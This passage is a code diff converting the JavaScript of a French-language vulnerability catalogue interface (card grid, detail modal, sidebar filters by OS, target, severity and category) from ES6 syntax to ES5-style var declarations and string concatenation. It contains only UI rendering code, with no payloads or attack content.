+    for (var j = 0; j < Math.min(3, v.targets.length); j++) html += '<span class="tag">' + esc(v.targets[j]) + "</span>";
+    html += "</div></button>";
+  }
+  grid.innerHTML = html;
 }
 
 function openModal(id) {
-  const v = VULNS.find(x => x.id === id);
+  var v = null;
+  for (var i = 0; i < VULNS.length; i++) {
+    if (VULNS[i].id === id) { v = VULNS[i]; break; }
+  }
   if (!v) return;
-  const m = document.getElementById("modalInner");
-  m.innerHTML = `
-    <div class="modal-head">
-      <div>
-        <div class="badges" style="margin-bottom:.35rem">
-          <span class="badge sev-${v.severity}">${v.severity}</span>
-          ${v.cwe ? `<span class="badge badge-dim">${esc(v.cwe)}</span>` : ""}
-          ${v.owasp ? `<span class="badge badge-dim" style="color:var(--accent)">${esc(v.owasp)}</span>` : ""}
-        </div>
-        <h2>${esc(v.name)}</h2>
-        <div class="sub" style="margin-top:.2rem">${esc(v.category)}</div>
-      </div>
-      <button class="close" type="button" id="closeModal">✕</button>
-    </div>
-    <div class="modal-body">
-      <div class="section"><h4>Description</h4><p>${esc(v.description)}</p></div>
-      <div class="section"><h4>Comment ça marche</h4><p>${esc(v.how)}</p>
-        ${v.example ? `<pre>${esc(v.example)}</pre>` : ""}
-      </div>
-      <div class="section"><h4>Outils</h4><div class="tool-list">${(v.tools||[]).map(t=>`<span class="tool">${esc(t)}</span>`).join("")}</div></div>
-      <div class="section"><h4>Mitigation</h4><p>${esc(v.mitigation)}</p></div>
-      <div class="section"><h4>Lab / pratique</h4><p>${esc(v.lab)}</p></div>
-      <div class="meta-row">
-        <span class="label">OS :</span>
-        ${v.os.map(o=>`<span class="badge" style="background:rgba(124,58,237,.1);color:var(--accent);border-color:rgba(124,58,237,.2)">${esc(o)}</span>`).join("")}
-        <span class="label" style="margin-left:.5rem">Cibles :</span>
-        ${v.targets.map(t=>`<span class="badge" style="background:rgba(6,182,212,.1);color:var(--accent2);border-color:rgba(6,182,212,.2)">${esc(t)}</span>`).join("")}
-      </div>
-    </div>
-  `;
+
+  var html = '<div class="modal-head"><div>';
+  html += '<div class="badges" style="margin-bottom:.35rem">';
+  html += '<span class="badge sev-' + v.severity + '">' + v.severity + "</span>";
+  if (v.cwe) html += '<span class="badge badge-dim">' + esc(v.cwe) + "</span>";
+  if (v.owasp) html += '<span class="badge badge-dim" style="color:var(--accent)">' + esc(v.owasp) + "</span>";
+  html += "</div>";
+  html += "<h2>" + esc(v.name) + "</h2>";
+  html += '<div class="sub" style="margin-top:.2rem">' + esc(v.category) + "</div>";
+  html += '</div><button class="close" type="button" id="closeModal">✕</button></div>';
+  html += '<div class="modal-body">';
+  html += '<div class="section"><h4>Description</h4><p>' + esc(v.description) + "</p></div>";
+  html += '<div class="section"><h4>Comment ça marche</h4><p>' + esc(v.how) + "</p>";
+  if (v.example) html += "<pre>" + esc(v.example) + "</pre>";
+  html += "</div>";
+  html += '<div class="section"><h4>Outils</h4><div class="tool-list">';
+  if (v.tools) {
+    for (var i = 0; i < v.tools.length; i++) html += '<span class="tool">' + esc(v.tools[i]) + "</span>";
+  }
+  html += "</div></div>";
+  html += '<div class="section"><h4>Mitigation</h4><p>' + esc(v.mitigation) + "</p></div>";
+  html += '<div class="section"><h4>Lab / pratique</h4><p>' + esc(v.lab) + "</p></div>";
+  html += '<div class="meta-row"><span class="label">OS :</span>';
+  for (var i = 0; i < v.os.length; i++) {
+    html += '<span class="badge" style="background:rgba(124,58,237,.1);color:var(--accent);border-color:rgba(124,58,237,.2)">' + esc(v.os[i]) + "</span>";
+  }
+  html += '<span class="label" style="margin-left:.5rem">Cibles :</span>';
+  for (var i = 0; i < v.targets.length; i++) {
+    html += '<span class="badge" style="background:rgba(6,182,212,.1);color:var(--accent2);border-color:rgba(6,182,212,.2)">' + esc(v.targets[i]) + "</span>";
+  }
+  html += "</div></div>";
+
+  document.getElementById("modalInner").innerHTML = html;
   document.getElementById("modal").style.display = "flex";
   document.getElementById("closeModal").onclick = closeModal;
 }
@@ -355,30 +439,38 @@ function closeModal() {
   document.getElementById("modal").style.display = "none";
 }
 
-document.getElementById("q").addEventListener("input", e => {
+document.getElementById("q").addEventListener("input", function (e) {
   state.q = e.target.value;
   renderGrid();
 });
-document.getElementById("sidebar").addEventListener("click", e => {
-  const t = e.target.closest("[data-os],[data-target],[data-sev],[data-cat]");
+
+document.getElementById("sidebar").addEventListener("click", function (e) {
+  var t = e.target.closest("[data-os],[data-target],[data-sev],[data-cat]");
   if (!t) return;
-  if (t.dataset.os) state.os = t.dataset.os;
-  if (t.dataset.target) state.target = t.dataset.target;
-  if (t.dataset.sev) state.severity = t.dataset.sev;
-  if (t.dataset.cat) state.category = t.dataset.cat;
+  if (t.getAttribute("data-os")) state.os = t.getAttribute("data-os");
+  if (t.getAttribute("data-target")) state.target = t.getAttribute("data-target");
+  if (t.getAttribute("data-sev")) state.severity = t.getAttribute("data-sev");
+  if (t.getAttribute("data-cat")) state.category = t.getAttribute("data-cat");
   renderFilters();
   renderGrid();
   document.getElementById("sidebar").classList.remove("open");
 });
-document.getElementById("grid").addEventListener("click", e => {
-  const c = e.target.closest("[data-id]");
-  if (c) openModal(c.dataset.id);
+
+document.getElementById("grid").addEventListener("click", function (e) {
+  var c = e.target.closest("[data-id]");
+  if (c) openModal(c.getAttribute("data-id"));
 });
-document.getElementById("modal").addEventListener("click", e => {
+
+document.getElementById("modal").addEventListener("click", function (e) {
   if (e.target.id === "modal") closeModal();
 });
-document.getElementById("btnFilters").onclick = () => document.getElementById("sidebar").classList.add("open");
-document.getElementById("closeFilters").onclick = () => document.getElementById("sidebar").classList.remove("open");
+
+document.getElementById("btnFilters").onclick = function () {
+  document.getElementById("sidebar").classList.add("open");
+};
+document.getElementById("closeFilters").onclick = function () {
+  document.getElementById("sidebar").classList.remove("open");
+};
 
 renderFilters();
 renderGrid();
